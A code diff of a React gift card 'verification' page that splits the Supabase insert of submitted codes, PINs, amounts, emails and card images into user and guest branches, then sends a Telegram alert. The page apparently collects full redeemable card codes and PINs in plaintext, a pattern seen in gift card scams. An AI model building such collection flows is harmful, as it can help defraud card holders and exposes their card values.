@@ -74,24 +74,46 @@ const VerifyGiftcard = () => {
       }
 
       // Store verification request in database
-      const { data: verificationData, error: dbError } = await supabase
-        .from('gift_card_verifications')
-        .insert({
-          user_id: user?.id || guestUserId,
-          country: formData.country,
-          giftcard_name: formData.giftcardName,
-          code: formData.code,
-          pin: formData.pin,
-          amount: formData.amount,
-          email: formData.email,
-          front_image_path: frontImagePath,
-          back_image_path: backImagePath,
-          status: 'pending'
-        })
-        .select()
-        .single();
+      let verificationId: string | null = null;
+      if (user) {
+        const { data, error } = await supabase
+          .from('gift_card_verifications')
+          .insert({
+            user_id: user.id,
+            country: formData.country,
+            giftcard_name: formData.giftcardName,
+            code: formData.code,
+            pin: formData.pin,
+            amount: formData.amount,
+            email: formData.email,
+            front_image_path: frontImagePath,
+            back_image_path: backImagePath,
+            status: 'pending'
+          })
+          .select()
+          .maybeSingle();
 
-      if (dbError) throw dbError;
+        if (error) throw error;
+        verificationId = data?.id ?? null;
+      } else {
+        const { error } = await supabase
+          .from('gift_card_verifications')
+          .insert({
+            user_id: guestUserId,
+            country: formData.country,
+            giftcard_name: formData.giftcardName,
+            code: formData.code,
+            pin: formData.pin,
+            amount: formData.amount,
+            email: formData.email,
+            front_image_path: frontImagePath,
+            back_image_path: backImagePath,
+            status: 'pending'
+          });
+
+        if (error) throw error;
+      }
+
 
       // Send Telegram notification for new verification
       try {
@@ -102,7 +124,7 @@ const VerifyGiftcard = () => {
             giftcardName: formData.giftcardName,
             amount: formData.amount,
             country: formData.country,
-            verificationId: verificationData?.id,
+            verificationId,
           },
         });
       } catch (notificationError) {
